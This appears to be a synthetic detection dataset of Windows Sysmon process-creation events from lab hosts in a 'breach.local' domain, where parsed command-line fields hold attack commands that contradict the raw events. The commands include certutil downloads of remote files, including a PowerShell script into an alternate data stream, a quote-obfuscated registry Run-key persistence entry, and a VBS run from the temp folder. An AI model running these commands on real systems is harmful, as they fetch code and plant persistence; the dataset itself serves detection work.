"{'record_id': 1652, 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'process': {'pid': 1904, 'thread': {'id': 308}}, 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog', 'provider_name': 'Microsoft-Windows-Sysmon', 'event_data': {'Product': 'Microsoft® Windows® Operating System', 'Company': 'Microsoft Corporation', 'Description': 'Host Process for Windows Tasks', 'LogonId': '0x3e5', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'IntegrityLevel': 'System', 'LogonGuid': '{19FC45AC-76E8-601C-0000-0020E5030000}', 'OriginalFileName': 'taskhost.exe', 'TerminalSessionId': '0'}, 'event_id': 1, 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'computer_name': 'CLIENT3.breach.local', 'opcode': 'Info', 'version': 5, 'channel': 'Microsoft-Windows-Sysmon/Operational'}","{'record_id': 1332, 'task': 'Process Create (rule: ProcessCreate)', 'provider_name': 'Microsoft-Windows-Sysmon', 'computer_name': 'CLIENT1.breach.local', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'process': {'pid': 1928, 'thread': {'id': 1716}}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'api': 'wineventlog', 'opcode': 'Info', 'version': 5, 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'event_id': 1, 'event_data': {'Product': 'Microsoft® Windows® Operating System', 'FileVersion': '6.1.7600.16385 (win7_rtm.090713-1255)', 'OriginalFileName': 'svchost.exe', 'LogonId': '0x3e7', 'LogonGuid': '{19FC45AC-768F-601C-0000-0020E7030000}', 'Description': 'Host Process for Windows Services', 'TerminalSessionId': '0', 'IntegrityLevel': 'System', 'Company': 'Microsoft Corporation'}}"
"{'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-05T07:08:57.554Z', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event'}","{'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:37:09.055Z', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1}"
"Process Create:
RuleName: 
UtcTime: 2021-02-05 07:08:54.675
ProcessGuid: {19FC45AC-EF06-601C-0000-001049E75300}
ProcessId: 1540
Image: C:\Windows\System32\taskhost.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhost.exe
CommandLine: taskhost.exe $(Arg0)
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\LOCAL SERVICE
LogonGuid: {19FC45AC-76E8-601C-0000-0020E5030000}
LogonId: 0x3e5
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=7FA8BA5A780E4757964AC9D4238302B9,SHA256=65E3D8CE737896647065103FBB4D58E6A34171D0A48662A832CFDAC3CF469701
ParentProcessGuid: {19FC45AC-76E7-601C-0000-001081630000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:34:56.046
ProcessGuid: {19FC45AC-7690-601C-0000-0010907C0000}
ProcessId: 580
Image: C:\Windows\System32\svchost.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-768F-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=54A47F6B5E09A77E61649109C6A08866,SHA256=121118A0F5E0E8C933EFD28C9901E54E42792619A8A3A6D11E1F0025A7324BC2
ParentProcessGuid: {19FC45AC-768F-601C-0000-0010EE630000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe"
"{'entity_id': '{19FC45AC-EF06-601C-0000-001049E75300}', 'working_directory': 'C:\\Windows\\system32\\', 'args': ['taskhost.exe', '$(Arg0)'], 'pid': 1540, 'executable': 'C:\\Windows\\System32\\taskhost.exe', 'command_line': 'cscript.exe %TEMP%\\Retrive2646804049303142888.vbs ', 'parent': {'entity_id': '{19FC45AC-76E7-601C-0000-001081630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'taskhost.exe', 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}}","{'name': 'svchost.exe', 'executable': 'C:\\Windows\\System32\\svchost.exe', 'command_line': 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v cRwUMdaPVwP /t REG_EXPAND_SZ /d ""\\""\\App""Dat""a\\Ro""ami""ng\\Or""ac""le\\bin\\ja""vaw.ex""e \\"" -jar \\""%USERPROFILE%\\sgazsBZvxHC\\GKPKtwfspIg.ddKgDj\\"""" /f', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-768F-601C-0000-0010EE630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'args': ['C:\\Windows\\system32\\svchost.exe', '-k', 'DcomLaunch'], 'hash': {'md5': '54a47f6b5e09a77e61649109c6a08866', 'sha256': '121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2'}, 'entity_id': '{19FC45AC-7690-601C-0000-0010907C0000}', 'pid': 580}"
"{'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103'], 'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT3', 'name': 'CLIENT3.breach.local', 'architecture': 'x86', 'os': {'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)'}}","{'hostname': 'CLIENT1', 'architecture': 'x86', 'os': {'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101'], 'name': 'CLIENT1.breach.local', 'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0']}"
"{'user': 'LOCAL SERVICE', 'hash': ['7fa8ba5a780e4757964ac9d4238302b9', '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701']}","{'hash': ['54a47f6b5e09a77e61649109c6a08866', '121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2'], 'user': 'SYSTEM'}"
2021-02-04T22:36:08.031Z,2021-02-04T22:27:16.265Z
"{'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:38:22.761Z'}","{'created': '2021-02-04T22:31:13.040Z', 'kind': 'event', 'code': 1, 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)'}"
"{'ip': ['192.168.56.102', '172.16.1.2', 'fe80::5efe:c0a8:3866', 'fe80::5efe:ac10:102'], 'mac': ['00:50:56:00:03:02', '00:50:56:00:00:02', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT2', 'name': 'CLIENT2.breach.local', 'architecture': 'x86', 'os': {'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4'}","{'name': 'CLIENT', 'hostname': 'CLIENT3', 'architecture': 'x86', 'os': {'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103'], 'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0']}"
"{'user': 'SYSTEM', 'hash': ['b5c5dcad3899512020d135600129d665', 'f6b4d18fa0d3c4958711ac0d476c21a6fdf2897f989a0ad290b43f463dd8b5b0']}","{'user': 'SYSTEM', 'hash': ['27945cf21e17afbff1e31993aaee4551', 'e24137efc6215fcd27479e0c1c455518b1d39f75b8cf67e8a9b46dcddcecb350']}"
"{'opcode': 'Info', 'process': {'pid': 1704, 'thread': {'id': 1804}}, 'task': 'Process Create (rule: ProcessCreate)', 'computer_name': 'CLIENT2.breach.local', 'record_id': 1326, 'event_data': {'OriginalFileName': 'WinInit.exe', 'Product': 'Microsoft® Windows® Operating System', 'IntegrityLevel': 'System', 'Description': 'Windows Start-Up Application', 'LogonId': '0x3e7', 'LogonGuid': '{19FC45AC-76D8-601C-0000-0020E7030000}', 'FileVersion': '6.1.7600.16385 (win7_rtm.090713-1255)', 'TerminalSessionId': '0', 'Company': 'Microsoft Corporation'}, 'user': {'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM'}, 'event_id': 1, 'provider_name': 'Microsoft-Windows-Sysmon', 'api': 'wineventlog', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'version': 5}","{'channel': 'Microsoft-Windows-Sysmon/Operational', 'event_id': 1, 'opcode': 'Info', 'event_data': {'LogonGuid': '{19FC45AC-74C4-601C-0000-0020E7030000}', 'IntegrityLevel': 'System', 'LogonId': '0x3e7', 'OriginalFileName': 'lsass.exe', 'FileVersion': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'Description': 'Local Security Authority Process', 'Company': 'Microsoft Corporation', 'TerminalSessionId': '0', 'Product': 'Microsoft® Windows® Operating System'}, 'task': 'Process Create (rule: ProcessCreate)', 'computer_name': 'CLIENT', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'provider_name': 'Microsoft-Windows-Sysmon', 'record_id': 1158, 'user': {'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18'}, 'api': 'wineventlog', 'version': 5, 'process': {'thread': {'id': 1064}, 'pid': 1692}}"
"Process Create:
RuleName: 
UtcTime: 2021-02-04 22:36:08.031
ProcessGuid: {19FC45AC-76D8-601C-0000-001034590000}
ProcessId: 348
Image: C:\Windows\System32\wininit.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Windows Start-Up Application
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: WinInit.exe
CommandLine: wininit.exe
CurrentDirectory: C:\Windows\system32
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-76D8-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=B5C5DCAD3899512020D135600129D665,SHA256=F6B4D18FA0D3C4958711AC0D476C21A6FDF2897F989A0AD290B43F463DD8B5B0
ParentProcessGuid: {19FC45AC-76D7-601C-0000-0010CD440000}
ParentProcessId: 296
ParentImage: C:\Windows\System32\smss.exe
ParentCommandLine: \SystemRoot\System32\smss.exe 00000000 0000003c ","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:27:16.265
ProcessGuid: {19FC45AC-74C4-601C-0000-0010AB640000}
ProcessId: 452
Image: C:\Windows\System32\lsass.exe
FileVersion: 6.1.7601.18741 (win7sp1_gdr.150202-1526)
Description: Local Security Authority Process
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: lsass.exe
CommandLine: C:\Windows\system32\lsass.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-74C4-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=27945CF21E17AFBFF1E31993AAEE4551,SHA256=E24137EFC6215FCD27479E0C1C455518B1D39F75B8CF67E8A9B46DCDDCECB350
ParentProcessGuid: {19FC45AC-74C3-601C-0000-0010D1590000}
ParentProcessId: 348
ParentImage: C:\Windows\System32\wininit.exe
ParentCommandLine: wininit.exe"
"{'entity_id': '{19FC45AC-76D8-601C-0000-001034590000}', 'pid': 348, 'executable': 'C:\\Windows\\System32\\wininit.exe', 'working_directory': 'C:\\Windows\\system32', 'name': 'wininit.exe', 'command_line': 'C:\\Windows\\System32\\certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe', 'parent': {'args': ['\\SystemRoot\\System32\\smss.exe', '00000000', '0000003c'], 'entity_id': '{19FC45AC-76D7-601C-0000-0010CD440000}', 'pid': 296, 'executable': 'C:\\Windows\\System32\\smss.exe', 'command_line': '\\SystemRoot\\System32\\smss.exe 00000000 0000003c ', 'name': 'smss.exe'}, 'args': ['wininit.exe'], 'hash': {'md5': 'b5c5dcad3899512020d135600129d665', 'sha256': 'f6b4d18fa0d3c4958711ac0d476c21a6fdf2897f989a0ad290b43f463dd8b5b0'}}","{'hash': {'md5': '27945cf21e17afbff1e31993aaee4551', 'sha256': 'e24137efc6215fcd27479e0c1c455518b1d39f75b8cf67e8a9b46dcddcecb350'}, 'entity_id': '{19FC45AC-74C4-601C-0000-0010AB640000}', 'command_line': 'C:\\Windows\\System32\\certutil.exe -verify""""ctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe', 'parent': {'executable': 'C:\\Windows\\System32\\wininit.exe', 'command_line': 'wininit.exe', 'name': 'wininit.exe', 'args': ['wininit.exe'], 'entity_id': '{19FC45AC-74C3-601C-0000-0010D1590000}', 'pid': 348}, 'args': ['C:\\Windows\\system32\\lsass.exe'], 'pid': 452, 'executable': 'C:\\Windows\\System32\\lsass.exe', 'working_directory': 'C:\\Windows\\system32\\', 'name': 'lsass.exe'}"
"{'md5': 'b5c5dcad3899512020d135600129d665', 'sha256': 'f6b4d18fa0d3c4958711ac0d476c21a6fdf2897f989a0ad290b43f463dd8b5b0'}","{'md5': '27945cf21e17afbff1e31993aaee4551', 'sha256': 'e24137efc6215fcd27479e0c1c455518b1d39f75b8cf67e8a9b46dcddcecb350'}"
"{'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT2', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT2', 'ephemeral_id': 'd5d7daa0-c0ba-4d39-9140-3b4a4308a222'}","{'hostname': 'CLIENT3', 'ephemeral_id': 'f5ed3d9b-1471-4589-bd70-28219e0f5978', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3', 'type': 'winlogbeat', 'version': '7.10.2'}"
2021-02-04T22:36:08.031Z,2021-02-04T23:06:26.328Z
"{'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:38:22.761Z'}","{'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T23:06:28.168Z', 'kind': 'event'}"
"{'ip': ['192.168.56.102', '172.16.1.2', 'fe80::5efe:c0a8:3866', 'fe80::5efe:ac10:102'], 'mac': ['00:50:56:00:03:02', '00:50:56:00:00:02', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT2', 'name': 'CLIENT2.breach.local', 'architecture': 'x86', 'os': {'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4'}","{'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103'], 'name': 'CLIENT3.breach.local', 'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT3', 'architecture': 'x86', 'os': {'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)'}}"
"{'user': 'SYSTEM', 'hash': ['b5c5dcad3899512020d135600129d665', 'f6b4d18fa0d3c4958711ac0d476c21a6fdf2897f989a0ad290b43f463dd8b5b0']}","{'user': 'LOCAL SERVICE', 'hash': ['51138beea3e2c21ec44d0932c71762a8', '5ad3c37e6f2b9db3ee8b5aeedc474645de90c66e3d95f8620c48102f1eba4124']}"
"{'opcode': 'Info', 'process': {'pid': 1704, 'thread': {'id': 1804}}, 'task': 'Process Create (rule: ProcessCreate)', 'computer_name': 'CLIENT2.breach.local', 'record_id': 1326, 'event_data': {'OriginalFileName': 'WinInit.exe', 'Product': 'Microsoft® Windows® Operating System', 'IntegrityLevel': 'System', 'Description': 'Windows Start-Up Application', 'LogonId': '0x3e7', 'LogonGuid': '{19FC45AC-76D8-601C-0000-0020E7030000}', 'FileVersion': '6.1.7600.16385 (win7_rtm.090713-1255)', 'TerminalSessionId': '0', 'Company': 'Microsoft Corporation'}, 'user': {'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM'}, 'event_id': 1, 'provider_name': 'Microsoft-Windows-Sysmon', 'api': 'wineventlog', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'version': 5}","{'record_id': 1519, 'api': 'wineventlog', 'event_id': 1, 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)', 'process': {'pid': 1904, 'thread': {'id': 308}}, 'event_data': {'LogonGuid': '{19FC45AC-76E8-601C-0000-0020E5030000}', 'Product': 'Microsoft® Windows® Operating System', 'TerminalSessionId': '0', 'Description': 'Windows host process (Rundll32)', 'IntegrityLevel': 'System', 'LogonId': '0x3e5', 'OriginalFileName': 'RUNDLL32.EXE', 'Company': 'Microsoft Corporation', 'FileVersion': '6.1.7600.16385 (win7_rtm.090713-1255)'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'opcode': 'Info', 'version': 5, 'user': {'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18'}, 'computer_name': 'CLIENT3.breach.local'}"
"Process Create:
RuleName: 
UtcTime: 2021-02-04 22:36:08.031
ProcessGuid: {19FC45AC-76D8-601C-0000-001034590000}
ProcessId: 348
Image: C:\Windows\System32\wininit.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Windows Start-Up Application
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: WinInit.exe
CommandLine: wininit.exe
CurrentDirectory: C:\Windows\system32
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-76D8-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=B5C5DCAD3899512020D135600129D665,SHA256=F6B4D18FA0D3C4958711AC0D476C21A6FDF2897F989A0AD290B43F463DD8B5B0
ParentProcessGuid: {19FC45AC-76D7-601C-0000-0010CD440000}
ParentProcessId: 296
ParentImage: C:\Windows\System32\smss.exe
ParentCommandLine: \SystemRoot\System32\smss.exe 00000000 0000003c ","Process Create:
RuleName: 
UtcTime: 2021-02-04 23:06:26.328
ProcessGuid: {19FC45AC-7DF2-601C-0000-0010F95F0E00}
ProcessId: 3024
Image: C:\Windows\System32\rundll32.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Windows host process (Rundll32)
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: C:\Windows\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\LOCAL SERVICE
LogonGuid: {19FC45AC-76E8-601C-0000-0020E5030000}
LogonId: 0x3e5
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=51138BEEA3E2C21EC44D0932C71762A8,SHA256=5AD3C37E6F2B9DB3EE8B5AEEDC474645DE90C66E3D95F8620C48102F1EBA4124
ParentProcessGuid: {19FC45AC-76E7-601C-0000-001081630000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe"
"{'entity_id': '{19FC45AC-76D8-601C-0000-001034590000}', 'pid': 348, 'executable': 'C:\\Windows\\System32\\wininit.exe', 'working_directory': 'C:\\Windows\\system32', 'name': 'wininit.exe', 'command_line': 'C:\\Windows\\System32\\certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe', 'parent': {'args': ['\\SystemRoot\\System32\\smss.exe', '00000000', '0000003c'], 'entity_id': '{19FC45AC-76D7-601C-0000-0010CD440000}', 'pid': 296, 'executable': 'C:\\Windows\\System32\\smss.exe', 'command_line': '\\SystemRoot\\System32\\smss.exe 00000000 0000003c ', 'name': 'smss.exe'}, 'args': ['wininit.exe'], 'hash': {'md5': 'b5c5dcad3899512020d135600129d665', 'sha256': 'f6b4d18fa0d3c4958711ac0d476c21a6fdf2897f989a0ad290b43f463dd8b5b0'}}","{'entity_id': '{19FC45AC-7DF2-601C-0000-0010F95F0E00}', 'executable': 'C:\\Windows\\System32\\rundll32.exe', 'args': ['C:\\Windows\\system32\\rundll32.exe', '/d', 'acproxy.dll,PerformAutochkOperations'], 'hash': {'md5': '51138beea3e2c21ec44d0932c71762a8', 'sha256': '5ad3c37e6f2b9db3ee8b5aeedc474645de90c66e3d95f8620c48102f1eba4124'}, 'pid': 3024, 'command_line': 'certutil.exe ""-urlcache"" -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\\temp:ttt', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-76E7-601C-0000-001081630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'rundll32.exe'}"
"{'domain': 'NT AUTHORITY', 'name': 'SYSTEM'}","{'domain': 'NT AUTHORITY', 'name': 'LOCAL SERVICE'}"
"{'md5': 'b5c5dcad3899512020d135600129d665', 'sha256': 'f6b4d18fa0d3c4958711ac0d476c21a6fdf2897f989a0ad290b43f463dd8b5b0'}","{'sha256': '5ad3c37e6f2b9db3ee8b5aeedc474645de90c66e3d95f8620c48102f1eba4124', 'md5': '51138beea3e2c21ec44d0932c71762a8'}"
"{'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT2', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT2', 'ephemeral_id': 'd5d7daa0-c0ba-4d39-9140-3b4a4308a222'}","{'hostname': 'CLIENT3', 'ephemeral_id': '177650cc-629c-4abf-8b93-a90e2e515251', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3', 'type': 'winlogbeat', 'version': '7.10.2'}"
2021-02-04T22:36:08.031Z,2021-02-04T22:29:03.062Z
"{'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:38:22.761Z'}","{'kind': 'event', 'code': 1, 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:11.541Z'}"
"{'user': 'SYSTEM', 'hash': ['b5c5dcad3899512020d135600129d665', 'f6b4d18fa0d3c4958711ac0d476c21a6fdf2897f989a0ad290b43f463dd8b5b0']}","{'user': 'LOCAL SERVICE', 'hash': ['54a47f6b5e09a77e61649109c6a08866', '121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2']}"
